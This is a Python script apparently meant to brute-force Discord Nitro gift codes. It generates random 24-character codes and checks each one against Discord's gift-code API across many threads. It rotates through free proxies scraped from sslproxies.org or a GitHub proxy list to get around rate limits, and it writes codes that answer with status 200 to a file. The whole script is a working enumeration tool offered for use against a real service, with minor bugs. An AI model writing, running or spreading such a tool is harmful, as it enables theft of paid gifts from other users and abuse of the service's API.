import requests, random, string, threading
from bs4 import BeautifulSoup
def generate_code():
    chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
    rand_code = ''.join(random.choice(chars) for _ in range(24))
    if rand_code in open("already_checked_codes.txt","r").read():
        generate_code()
    else:
        return rand_code
def proxy_generator():
    response = requests.get("https://sslproxies.org/")
    soup = BeautifulSoup(response.content, 'html.parser')
    parent_element = soup.select_one('html > body > section:nth-of-type(1) > div > div:nth-of-type(2) > div > table > tbody')
    children = parent_element.children
    children_ = []
    for i in children:
        children_.append(i)
    child = random.choice(children_)
    data_list = child.find_all('td')
    ip = data_list[0].text 
    port = data_list[1].text
    proxy = {"http":f"http://{ip}:{port}"}
    try:
        requests.get("https://www.google.com/",proxies=proxy)
    except:
        pass
    finally:
        return proxy
def proxy_generator_v2():
    r = requests.get("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt")
    proxies = r.text.splitlines()
    proxy = random.choice(proxies)
    proxy = {"http":f"http://{proxy}"}
    try:
        requests.get("https://www.google.com/",proxies=proxy)
    except:
        pass
    finally:
        return proxy

def check_codes():
    while True:
        try:
            code = generate_code()
            proxy = proxy_generator_v2()
            r = requests.get("https://discordapp.com/api/v9/entitlements/gift-codes/"+code +"?with_application=false&with_subscription_plan=true",proxies=proxy,timeout=10)
            if r.status_code == 200:
                print(f"(V) | {code} | {threading.current_thread().name}")
                open('valid_codes.txt', 'a').write(f'https://discord.gift/{code}'+'\n')
            elif r.status_code == 429:
                print(f"(RL) | {code} | {proxy['http']} | {threading.current_thread().name}")
            else:
                print(f"(I) | {code} | {threading.current_thread().name}")
                open("already_checked_codes.txt","a").write("\n"+code)
        except:
            pass
thread = input("(IT) Threads >> ")
try: 
    thread = int(thread)
except:
    input("(IN) Invalid Input.\n(IN) Press ENTER to exit.")
for i in range(thread):
    threading.Thread(target=check_codes).start()
    print(f"(T) | Started a thread:",i)
